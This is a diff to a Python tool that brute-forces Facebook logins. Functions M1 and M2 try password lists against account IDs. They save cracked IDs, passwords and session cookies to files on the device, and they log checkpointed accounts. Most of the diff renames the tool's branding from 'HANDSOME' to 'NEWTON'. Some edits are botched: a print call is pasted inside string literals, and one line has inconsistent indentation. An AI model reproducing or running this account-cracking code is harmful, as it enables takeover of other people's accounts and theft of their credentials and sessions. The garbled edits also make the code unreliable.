@@ -651,7 +651,7 @@ def gmail():
 def M1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [HANDSOME-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [NEWTON-M1] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -720,8 +720,8 @@ def M1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/HANDSOMEYY_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOMEYY_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        print('\r\r\033[1;32m [NEWTON-OK] '+ids+' | '+pas+'\033[1;97m')
+                                        open('/sdcard/NEWTON_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
                                         break
@@ -733,11 +733,11 @@ def M1(ids,names,passlist):
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
                                                 print('\r\r\x1b[1;91m [HANFSOME-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/HANDSOME_CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NEWTON_CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/HANDSOME_CP.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NEWTON_CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
@@ -749,7 +749,7 @@ def M1(ids,names,passlist):
 def M2(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [HANDSOME-M2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [NEWTONM2] %s|OK-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -818,9 +818,9 @@ def M2(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m')
-                                    #    print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
-                                        open('/sdcard/HANDSOME_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOME_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
+                                        print('\r\r\033[1;32m [print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)-OK] '+ids+' | '+pas+'\033[1;97m')
+					print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)
+                                        open('/sdcard/NEWTON_M2_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/NEWTON_iDs_COOKiE_M2.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         Elite(ids,pas,cookie)
                                         oks.append(ids)
                                         break
@@ -831,12 +831,12 @@ def M2(ids,names,passlist):
                                                 break
                                 elif 'www.facebook.com' in q['error']['message']:
                                         if 'y' in pcp:
-                                                print('\r\r\x1b[1;91m [FILE_BANA_YESLE] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/FILE_BANA_YESLE.txt', 'a').write(ids+'|'+pas+'\n')
+                                                print('\r\r\x1b[1;91m [print("\033[1;32m [COOOKIS] :\033[1;34m "+cookie)] '+ids+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/NEWTON-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                 cps.append(ids)
                                                 break
                                         else:
-                                                open('/sdcard/FILE_BANA_YESLE.txt','a').write(ids+'|'+pas+'\n')
+                                                open('/sdcard/NEWTON-CP.txt','a').write(ids+'|'+pas+'\n')
                                                 break
                                 else:
                                         continue
